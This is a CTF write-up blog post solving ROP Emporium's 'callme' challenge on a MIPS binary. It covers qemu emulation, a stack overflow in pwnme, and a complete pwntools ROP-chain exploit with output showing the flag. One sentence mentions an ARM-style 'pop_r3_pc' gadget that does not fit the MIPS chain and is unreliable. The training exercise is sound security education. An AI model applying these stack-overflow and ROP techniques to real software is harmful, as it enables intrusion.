---
layout: post
author: playoff-rondo
title:  "ROPemporium: CallMe MIPS"
date:   2020-10-10 18:01:37 -0500
categories: CTF-writeup
ctf-category: PWN
---

# callme MIPS
## Triage
![](https://i.imgur.com/4AAsy1E.png)

Chain calls to multiple imported methods with specific arguments and see how the differences between 64 & 32 bit calling conventions affect your ROP chain.
### Disassembly
main function calls vulnerable call pwnme

![](https://i.imgur.com/HWccWbN.png)

pwnme function 

![](https://i.imgur.com/FvCln4L.png)

## Eumulation
Because this binary is an MIPS archetecture, to be able to run the binary we need to emulate it somehow.

I will be using [qemu](https://www.qemu.org/), specifically qemu-mipsel

Install require libraries
`sudo apt install gcc-mipsel-linux-gnu`

Run the binary 
`qemu-mipsel -L /usr/mipsel-linux-gnu ./callme_mipsel `


## Vulnerability
In the pwnme function, 0x200 bytes are read into the user_input buff but the user_input buff is on the stack -0x28 (-40) bytes off from the return address.

If we supply 40 bytes, the last 4 bytes will overflow the return address and we gain control of the program counter.

Confirming the vulnerability:
```bash
python -c 'print "A"*36+"BBBB"' |qemu-mipsel -strace -L /usr/mipsel-linux-gnu ./callme_mipsel
```
```bash
--- SIGSEGV {si_signo=SIGSEGV, si_code=1, si_addr=0x42424242} ---
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[1]    3278807 done                              python -c 'print "A"*36+"BBBB"' | 
       3278808 segmentation fault (core dumped)  qemu-mipsel -strace -L /usr/mipsel-linux-gnu ./callme_mipsel
```

## Exploit
Description says:
`To dispose of the need for any RE I'll tell you the following:
You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag.`

In mipsel the way to pass function parameters through registers:
`a0,a1,a2,a3`

We need gadgets that can load the values off the stack and into the correct registers.
Using ROPgadget:
`lw_a0_a1_a2_t9 = p32(0x00400bb0)# : lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop`


We set the link register to the `pop_r3_pc` gadget to place the next function on the stack into `pc` but we also have a junk register of `r3` so I place 0 in there,

### Script
```python=
from pwn import *

context.binary = elf = ELF("./callme_mipsel")

lw_a0_a1_a2_t9 = p32(0x00400bb0)# : lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop

payload = "A"*36
payload += lw_a0_a1_a2_t9
payload += p32(0)
payload += p32(elf.sym['callme_one']) # t9
payload += p32(0xd00df00d)	# a2
payload += p32(0xcafebabe)	# a1
payload += p32(0xdeadbeef)	# a0

payload += lw_a0_a1_a2_t9
payload += p32(0)
payload += p32(elf.sym['callme_two']) # t9
payload += p32(0xd00df00d)	# a2
payload += p32(0xcafebabe)	# a1
payload += p32(0xdeadbeef)	# a0

payload += lw_a0_a1_a2_t9
payload += p32(0)
payload += p32(elf.sym['callme_three']) # t9
payload += p32(0xd00df00d)	# a2
payload += p32(0xcafebabe)	# a1
payload += p32(0xdeadbeef)	# a0

io = process("./callme_mipsel",env={"QEMU_LD_PREFIX":"/usr/mipsel-linux-gnu"})
#io =gdb.debug("./callme_mipsel",env={"QEMU_LD_PREFIX":"/usr/mipsel-linux-gnu"})
io.sendline(payload)
io.interactive()
```
### Result
```bash
[*] '/home/chris/ctfs/ropemporium/callme/mips/callme_mipsel'
    Arch:     mips-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  '.'
[+] Starting local process './callme_mipsel': pid 3281191
[*] Switching to interactive mode
callme by ROP Emporium
MIPS

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
```
